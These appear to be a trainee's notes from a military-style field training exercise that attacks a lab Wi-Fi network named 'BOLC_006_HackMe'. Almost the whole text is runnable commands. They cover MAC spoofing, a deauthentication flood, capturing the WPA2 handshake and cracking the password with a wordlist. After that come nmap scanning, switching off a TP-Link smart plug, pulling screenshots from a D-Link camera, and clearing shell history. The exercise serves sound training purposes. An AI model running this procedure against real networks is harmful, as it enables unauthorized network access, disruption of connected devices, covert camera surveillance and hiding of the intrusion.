FTX - Effect Exercise
Class: 25/006
Note: Some commands require SUDO; Advisable to set up collection and command terminal windows

Steps: 
Confirm wlan int is up; make sure Alfa network is plugged in
	iwconfig
Change mac to hide Alfa - good best practice
	sudo macchanger -r wlan1
Place int in monitor mode -> this is a critical step.
	airmon-ng start wlan1
	confirm in iwconfig
Initial scan
	airodump-ng wlan1mon
	 0C:9D:92:49:C2:A8  -46       52       10    0   1  195   WPA2 CCMP   PSK  BOLC_006_HackMe 
	Note: the critical information to review is alos the channel. Here it is 1. It can be different.    
Channel Loc and BBSID lock
	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 
	Note: update channel if different channel is identified from prior step (initial scan)
Posture to collect handshake
	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 --write 006hackmehandshake
	Note: update channel if different channel is identified from prior step (initial scan)
Conduct Deauth
	aireplay-ng --deauth 100 -a 0C:9D:92:49:C2:A8 wlan1mon
Confirm in airodump window that handshake is collected
	PMKID found: 0C:9D:92:49:C2:A8 
Find PW
	aircrack-ng 006hackmehandshake-01.cap -w /usr/share/wordlists/rockyou.txt 
	key found: quicksilver
Change Wifi network to the target network and put password found in last step (Find PW)
	Note: if you don't change the IP, the next set of steps will not be correct.
Authenticate with AP
	ipconfig (confirm you have an IP)
	192.168.50.3
Ping sweep 
	Initial Ping Sweep - 
	for i in {1..254}; do ping -c 1 192.168.50.$i | grep "from"; done
	.1 and .3 -> however, there may be hidden IPs. 
	
	Stealth PingSweep on /24 for hidden or non-visible IPs
	nmap -sP 192.168.50.1/24 -oA pingsweep
	Note: -oA produces files on local box (artifacts) for related request
	Evidence: .1 (asus), .76 (tplink), .197 (dlink)
	
Vert scan each host
	nmap -Pn -n -sT -sV 192.168.50.1 -oA tcpscan
	.1 - port 53,80
	.76 - port 9999
	.197 - port 80, 443,554, 49152

Hacker boi shit
	Note: navigate to github for TPLink_SmartPlug. Find the .py script. -> https://github.com/softScheck/tplink-smartplug. This needs to be on your local box.
	./tplink_smartplug.py -t <ip> [-c <cmd> || -j <json>]
	Provide the target IP using -t and a command to send using either -c or -j. Commands for the -c flag:
	verify the right tplink or target	
	python3 tplink_smartplug.py -t 192.168.50.76 -c info 
	degrade system (turn off)
	python3 tplink_smartplug.py -t 192.168.50.76 -c off
	
Capture screenshots from camera:
	Navigate to Browser for .197 (Dlink) - This is the camera system
	Verify on Status Page to verify right camera
	Take Screenshots (as needed) on required cyber intel
	
Clean Up for Next User / Trainee
	a. rm files and artifacts
	b. clear history using: echo -n > ~/.zsh_history && exec zsh
	c. Go into settings manager in Kali, for Advanced Network Configurations for network. Remove wifi network of target.
